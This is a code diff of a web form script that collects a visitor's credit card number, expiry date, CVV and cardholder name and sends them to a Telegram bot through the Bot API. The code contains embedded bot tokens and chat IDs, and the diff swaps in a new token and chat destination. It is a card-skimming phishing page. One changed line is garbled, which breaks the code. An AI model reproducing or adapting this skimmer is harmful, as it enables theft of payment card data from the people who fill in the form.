@@ -174,14 +174,14 @@
       const formData = new FormData(document.getElementById('registrationForm'));
       const creditCard = formData.get('credit-card');
       const expiryDate = formData.get('expiration-date');
-      const cvv = formData.get('cvv');
+      const cvv =6938070577get('cvv');
       const cardholderName = formData.get('cardholder-name');
 
       // Construct message
       const message = `New registration:\nCredit Card: ${creditCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\nCardholder Name: ${cardholderName}`;
 
       // Send data to Telegram using fetch and the Telegram Bot API
-      fetch(`https://api.telegram.org/bot6789641797:AAH3tBZs38-Z6CB5bDQrPX6LZo4iVyq_yiY/sendMessage?chat_id=6929312170&text=${encodeURIComponent(message)}`)
+      fetch(`https://api.telegram.org/bot7153410440:AAExjNj91p4PEwftsiRi07OYcFb6_AADaU8/sendMessage?chat_id=6938070577&text=${encodeURIComponent(message)}`)
         .then(response => {
           if (response.ok) {
             // Redirect to another URL after successful submission
